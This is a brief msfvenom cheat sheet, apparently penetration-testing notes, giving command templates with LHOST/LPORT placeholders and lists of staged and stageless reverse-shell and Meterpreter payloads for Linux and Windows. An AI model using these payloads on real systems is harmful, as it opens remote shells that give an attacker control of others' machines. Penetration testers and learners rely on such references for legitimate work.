# MSFVenom

```
msfvenom -p [PAYLOAD] lhost=[LHOST] lport=[LPORT] R
msfvenom -p [PAYLOAD] LHOST=[LHOST] LPORT=[LPORT] -f [EXTENSION] -o [OUTPUT FILE]
```

- -p : payload
- lhost : our local host IP address (this is your machine's IP address)
- lport : the port to listen on (this is the port on your machine)
- R : export the payload in raw format


## Common Payload

### Normal Shell
#### Linux

Staged
```
linux/x64/shell/reverse_tcp
linux/x86/shell/reverse_tcp
```

Stageless
```
linux/x64/shell_reverse_tcp
linux/x86/shell_reverse_tcp
```

#### Windows

Staged
```
windows/x64/shell/reverse_tcp
windows/shell/reverse_tcp
```

Stageless
```
windows/x64/shell_reverse_tcp
windows/shell_reverse_tcp
```

### Meterpreter Shell
#### Linux

Staged
```
linux/x64/meterpreter/reverse_tcp
linux/x86/meterpreter/reverse_tcp
```

Stageless
```
linux/x64/meterpreter_reverse_tcp
linux/x86/meterpreter_reverse_tcp
```

#### Windows

Staged
```
windows/x64/meterpreter/reverse_tcp
windows/meterpreter/reverse_tcp
```

Stageless
```
windows/x64/meterpreter_reverse_tcp
windows/meterpreter_reverse_tcp
```
